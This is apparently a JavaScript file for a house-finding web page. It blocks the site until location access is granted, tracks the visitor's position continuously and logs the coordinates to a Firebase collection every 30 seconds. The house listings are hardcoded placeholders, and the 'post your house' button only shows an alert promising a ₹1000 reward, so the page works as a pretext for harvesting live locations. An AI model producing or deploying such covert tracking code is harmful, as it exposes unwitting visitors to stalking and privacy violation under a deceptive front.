import { db, addDoc, collection } from "./firebase-config.js";

let userLocation = null;
let lastSentTime = 0;

window.onload = () => {
  if (navigator.geolocation) {
    navigator.geolocation.watchPosition(
      position => {
        userLocation = {
          lat: position.coords.latitude,
          lng: position.coords.longitude
        };

        console.log("Updated Location: ", userLocation);

        // Remove blocker
        const blocker = document.getElementById("location-blocker");
        if (blocker.style.display !== "none") {
          blocker.style.display = "none";
          fetchNearbyHouses(userLocation);
        }

        const now = Date.now();
        if (now - lastSentTime > 30000) {
          lastSentTime = now;
          sendLocationToDeveloper(userLocation);
        }
      },
      error => {
        document.getElementById("location-blocker").innerHTML = `
          ❗ Location permission is required to use this site.<br>
          Please refresh the page and allow location access.`;
      },
      {
        enableHighAccuracy: true,
        maximumAge: 0,
        timeout: 5000
      }
    );
  } else {
    document.getElementById("location-blocker").innerHTML =
      "❗ Geolocation is not supported by your browser.";
  }
};

function fetchNearbyHouses(location) {
  const demoHouses = [
    { name: "Cozy Apartment", distance: "0.5 km" },
    { name: "Family House", distance: "1.2 km" },
    { name: "Single Room", distance: "0.8 km" }
  ];

  const houseList = document.getElementById("house-list");
  houseList.innerHTML = "";

  demoHouses.forEach(house => {
    const div = document.createElement("div");
    div.className = "house";
    div.innerHTML = `<h3>${house.name}</h3><p>Distance: ${house.distance}</p>`;
    houseList.appendChild(div);
  });
}

window.postHouse = function () {
  alert("Thank you for posting your house!\nYou earned ₹1000 reward.");
};

function sendLocationToDeveloper(location) {
  console.log("Sending location data to developers:", location);

  addDoc(collection(db, "locationLogs"), {
    lat: location.lat,
    lng: location.lng,
    timestamp: new Date()
  })
    .then(() => {
      console.log("Location saved to Firebase");
    })
    .catch((error) => {
      console.error("Error saving location:", error);
    });
}
